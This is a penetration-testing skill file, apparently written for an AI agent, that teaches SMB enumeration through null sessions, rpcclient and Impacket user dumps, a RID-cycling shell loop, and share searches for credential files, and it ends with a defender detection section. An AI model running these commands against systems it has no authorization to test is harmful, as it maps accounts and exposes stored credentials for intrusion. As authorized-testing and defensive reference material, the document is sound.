---
name: smb-enumeration
description: Use when enumerating SMB services on authorized Windows or Samba
  targets. Covers finding SMB hosts, testing null sessions, reading share
  listings, checking SMB signing, enumerating users and groups with rpcclient
  and Impacket, riding RIDs to dump usernames, and searching shares for
  sensitive files with smbclient. Use when port 445 or 139 is open and you
  need user lists, share maps, or proof of anonymous access before
  credentialed testing.
version: 1.0.0
domain: network
lifecycle: stable
last_verified: 2026-10-23
requires: []
extends: []
relates: [nmap-methodology, recon-active, ad-enumeration]
tools:
  - name: smbclient
    version: 4.21
  - name: Impacket
    version: 0.12.0
  - name: nmap
    version: 7.98
---

SMB (Server Message Block) is the file sharing protocol used by Windows
hosts and Samba servers, normally on TCP 445 and, on older setups, TCP 139.
Badly configured SMB exposes user lists, group membership, share names, and
sometimes whole file trees to anonymous or low privilege callers. This skill
covers read-only enumeration: finding SMB hosts, testing null sessions,
checking SMB signing, enumerating users and groups, riding RIDs to recover
usernames, listing shares, and searching readable shares for sensitive data.
Relay attacks and lateral movement are out of scope here. All testing targets
systems you have written permission to test.

## Quick Workflow

1. Find hosts with TCP 445 or 139 open on the target range.
2. Fingerprint the OS, the SMB dialect, and whether SMB signing is required.
3. Test anonymous access: null session share listing and null session RPC.
4. Enumerate users and groups with rpcclient or Impacket over the null
   session.
5. Ride RIDs to recover usernames when direct listing is blocked.
6. List every share and test read access on each one, anonymous first.
7. Search readable shares for credentials, backups, scripts, and documents.
8. Record every command and its output for the report.

## 1. Find SMB hosts

Sweep for the SMB ports first, then run SMB specific scripts only on live
hosts so you do not waste time on dead addresses.

```bash
# Fast SYN sweep for SMB ports across the subnet
nmap -p 445,139 --open -T4 192.168.1.0/24 -oG /tmp/smb-sweep.gnmap

# Pull the live SMB hosts out of the greppable output
grep '445/open' /tmp/smb-sweep.gnmap | cut -d' ' -f2 > /tmp/smb-hosts.txt
cat /tmp/smb-hosts.txt
```

```bash
# OS, dialect, and signing status for one target
nmap -p 445 --script smb-os-discovery,smb-security-mode,smb-protocols 192.168.1.10

# Same check over every host found in the sweep
nmap -p 445 -iL /tmp/smb-hosts.txt --script smb-security-mode -oN /tmp/smb-signing.txt
```

Read the `smb-security-mode` output carefully. `message_signing: required`
means relay and some tampering attacks will fail against that host, which
changes your later options. `smb-os-discovery` gives you the hostname,
workgroup or domain name, and OS build, which you need for RID work later.

## 2. Test null sessions and anonymous access

A null session is an SMB connection with an empty username and password.
Modern Windows blocks most of it by default, but Samba, NAS boxes, and
misconfigured servers still allow it.

```bash
# Anonymous share listing (the -N flag means no password)
smbclient -L //192.168.1.10 -N

# Same, but point at an explicit workgroup if listing fails
smbclient -L //192.168.1.10 -N -W WORKGROUP
```

A useful listing looks like this: share names under `Sharename`, plus the
`Server` and `Workgroup` lines. `IPC$` is always there and is not
interesting by itself.

```bash
# Null session RPC: ask the server about itself
rpcclient -U "" -N 192.168.1.10 -c "srvinfo"

# Check what the null session is allowed to query
rpcclient -U "" -N 192.168.1.10 -c "querydominfo"
```

If you get `NT_STATUS_ACCESS_DENIED` on `querydominfo`, anonymous RPC is
blocked and you move to RID cycling with a guessed SID or to authenticated
enumeration. If you get `NT_STATUS_LOGON_FAILURE`, the server rejects null
sessions entirely.

```bash
# Impacket equivalents, useful when rpcclient is not installed
impacket-samrdump 192.168.1.10
impacket-lookupsid 192.168.1.10
```

Both run anonymously by default. `lookupsid` brute forces RIDs and prints
`DOMAIN\username` lines, which is often the fastest path to a user list.

## 3. Enumerate users and groups

When the null session allows RPC, pull the full user and group lists. These
lists feed password spraying later and reveal service accounts worth
targeting.

```bash
# Domain or local users
rpcclient -U "" -N 192.168.1.10 -c "enumdomusers"

# Domain or local groups
rpcclient -U "" -N 192.168.1.10 -c "enumdomgroups"

# Details that betray the domain SID and password policy hints
rpcclient -U "" -N 192.168.1.10 -c "querydominfo"
rpcclient -U "" -N 192.168.1.10 -c "getdompwinfo"
```

```bash
# Resolve interesting accounts to full names and descriptions
rpcclient -U "" -N 192.168.1.10 -c "queryuser 0x1f4"

# List members of a group by its RID (0x200 is often Domain Admins style groups)
rpcclient -U "" -N 192.168.1.10 -c "querygroupmem 0x200"
```

Well known RIDs save time: 500 is the built-in Administrator, 501 is Guest,
512 is Domain Admins, 513 is Domain Users. On a domain controller,
`enumdomusers` returns domain accounts. On a member server or workstation it
returns local accounts, which is still useful.

## 4. Ride RIDs to recover usernames

When `enumdomusers` is blocked but SID lookup works, you can still recover
usernames. First get the domain SID, then query SIDs of the form
`S-1-5-21-<domain>-<RID>` one by one.

```bash
# Get the domain SID from the server info
rpcclient -U "" -N 192.168.1.10 -c "lsaquery" 2>/dev/null | grep -i "Domain Sid"

# Example output: Domain Sid: S-1-5-21-1234567890-1234567890-1234567890
# Now walk RIDs 500 to 1200 and resolve each one
SID="S-1-5-21-1234567890-1234567890-1234567890"
for rid in $(seq 500 1200); do
  out=$(rpcclient -U "" -N 192.168.1.10 -c "lookupsids $SID-$rid" 2>/dev/null)
  echo "$out" | grep -v "NT_STATUS_NONE_MAPPED\|unknown" | grep -q . && echo "$rid: $out"
done | tee /tmp/rid-users.txt
```

Filter the noise: mapped names look like `DOMAIN\username (1)`. Skip RIDs
that return `NT_STATUS_NONE_MAPPED`. Real accounts usually sit between 1000
and 1200 on domain controllers, but scan wider on member servers. Impacket
does the same walk with one command if you prefer it:

```bash
# Impacket RID brute force, anonymous
impacket-lookupsid 192.168.1.10 | tee /tmp/lookupsid.txt
```

## 5. List shares and test read access

List every share, then connect to each one and see what anonymous or guest
access allows. Test one share at a time and note the exact error for each.

```bash
# Full share list with comments
smbclient -L //192.168.1.10 -N

# Connect to a share anonymously and list its root
smbclient //192.168.1.10/SHARENAME -N -c "ls"

# Connect with a guessed guest account
smbclient //192.168.1.10/SHARENAME -U guest -N -c "ls"
```

Common errors and what they mean:

- `NT_STATUS_ACCESS_DENIED`: the share exists but this account cannot open
  it. Try authenticated access later.
- `NT_STATUS_BAD_NETWORK_NAME`: the share name is wrong or was removed.
- `NT_STATUS_LOGON_FAILURE`: credentials rejected, or null sessions are
  disabled.

```bash
# Recursive listing of a readable share, saved for review
smbclient //192.168.1.10/SHARENAME -N -c "recurse; ls" > /tmp/share-ls.txt 2>&1

# Download one interesting file for inspection (never whole shares blindly)
smbclient //192.168.1.10/SHARENAME -N -c "get interesting.docx /tmp/interesting.docx"
```

## 6. Search readable shares for sensitive data

Readable shares often hold backups, scripts with passwords, and old
documents. Search file names first, then peek inside text files. Stay
read-only and take only what proves impact.

```bash
# List everything recursively and grep for interesting names
smbclient //192.168.1.10/SHARENAME -N -c "recurse; ls" 2>/dev/null \
  | grep -i -E '\.bak|\.sql|\.ps1|\.vbs|\.kdbx|password|secret|backup|config' \
  | tee /tmp/interesting-files.txt

# Fetch a single config or script and inspect it locally
smbclient //192.168.1.10/SHARENAME -N -c "get deploy/config.ini /tmp/config.ini"
grep -i -E 'pass|pwd|secret|key' /tmp/config.ini | head -20
```

High value finds on real engagements: `unattend.xml` or `sysprep.xml` with
embedded credentials, VNC or RDP connection files, database backup dumps,
and IT folders with password spreadsheets. Each one goes into the report
with the share path and the exact command used to read it.

## 7. Authenticated enumeration

If you hold any valid credential (from an earlier phase, a default like
`guest` with blank password, or a sprayed account), repeat everything with
authentication. Authenticated sessions see far more.

```bash
# Authenticated share listing
smbclient -L //192.168.1.10 -U 'DOMAIN\user%Password1'

# Authenticated user and group enumeration
rpcclient -U 'DOMAIN\user%Password1' 192.168.1.10 -c "enumdomusers"

# Authenticated Impacket share and session dump
impacket-smbclient 'DOMAIN/user:Password1@192.168.1.10'
```

With credentials, also check `ADMIN$`, `C$`, and `IPC$` access, and re-run
the share search, because authenticated users usually see more shares than
anonymous ones.

## Edge cases

- The target only listens on TCP 139. Old Samba and very old Windows use
  NetBIOS sessions. Point smbclient at port 139 with `-p 139` and set
  `client min protocol = NT1` in your local smb.conf if negotiation fails.
- SMBv1 disabled and rpcclient fails to bind. Use Impacket tools, which
  negotiate modern dialects, or force a newer protocol in smb.conf with
  `client min protocol = SMB2`.
- `smbclient -L` returns an empty share list but `IPC$` connects. Listing
  is restricted; try connecting to guessed share names directly
  (`C$`, `ADMIN$`, `Shared`, `Data`, `Backup`, `IT`).
- `NT_STATUS_LOGON_FAILURE` with `-N`. Null sessions are disabled. Move
  to RID cycling via Impacket (which sometimes still works) or to
  authenticated enumeration.
- Large shares time out during recursive listing. List one directory level
  at a time with `cd` and `ls` instead of `recurse`, or target specific
  subfolders.
- Hostnames with dashes or unicode break shell quoting. Always quote the
  full `//host/share` path and the `-U 'DOMAIN\user%pass'` string.
- The domain SID from `lsaquery` is empty on a workgroup machine. Use the
  local machine SID shown by `impacket-lookupsid` output instead.
- Enumeration is slow over a WAN or VPN. Raise rpcclient timeouts by
  running fewer parallel commands and narrowing the RID range first
  (1000 to 1100), then widening.

## Escalation

- Guest account is enabled with a blank password. Enumerate as guest:
  `smbclient -L //TARGET -U guest -N`, then repeat the share search, since
  guest often sees more than a true null session.
- Null session blocked but port 445 open. Try password spraying against
  SMB with the usernames from RID cycling (see password-attacks), then
  re-run authenticated enumeration with any hit.
- Shares allow write access. Confirm with a harmless test file, then
  remove it immediately: `smbclient //TARGET/share -U user%pass -c "put
  /tmp/probe.txt probe-DELETE-ME.txt; del probe-DELETE-ME.txt"`. Writable
  shares are a finding by themselves.
- You find credentials in a share. Use them for authenticated enumeration
  across every SMB host in scope, not just the one where you found them.
- SMB signing is not required. Note it as a relay attack prerequisite for
  the AD team (see ad-enumeration); do not run the relay from this skill.
- Nothing is exposed. Record the negative result with the commands run.
  A clean SMB surface is still a reportable outcome.

## Detection and defender view

Defenders see unauthenticated SMB enumeration as bursts of connections to
TCP 445 from one source, Event ID 4624 logons with blank or guest
usernames, and Event ID 5140/5145 share access audits naming `IPC$`.
RID cycling shows as hundreds of `lookupsids` calls in a short window,
which stands out in Sysmon or EDR telemetry. Impacket tools have
recognizable SMB fingerprints (dialect negotiation quirks) that NDR
products flag. The durable fixes: set `restrictanonymous` and
`restrictsam` to block null session enumeration, require SMB signing via
Group Policy, disable the guest account, remove `Everyone` from share and
NTFS permissions, and audit shares regularly for stale sensitive files.
Honeypot shares with alerting catch enumeration early.

## Key references

- MITRE ATT&CK T1046 (Network Service Discovery): port sweeps for 445/139.
- MITRE ATT&CK T1135 (Network Share Discovery): share listing and mapping.
- MITRE ATT&CK T1021.004 (Remote Services, SMB/Windows Admin Shares):
  authenticated share access.
- MITRE ATT&CK T1003.002 (OS Credential Dumping, Security Account Manager):
  SAM reads over SMB.
- CWE-200 (Exposure of Sensitive Information): user lists and share maps.
- CWE-306 (Missing Authentication for Critical Function): null sessions.
- Microsoft: "RestrictAnonymous" registry documentation.
- Microsoft: "SMB signing" Group Policy documentation.
- Samba smbclient manual: https://www.samba.org/samba/docs/current/man-html/smbclient.1.html
- Impacket documentation: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/
- nmap smb NSE scripts: https://nmap.org/nsedoc/scripts/smb-os-discovery.html
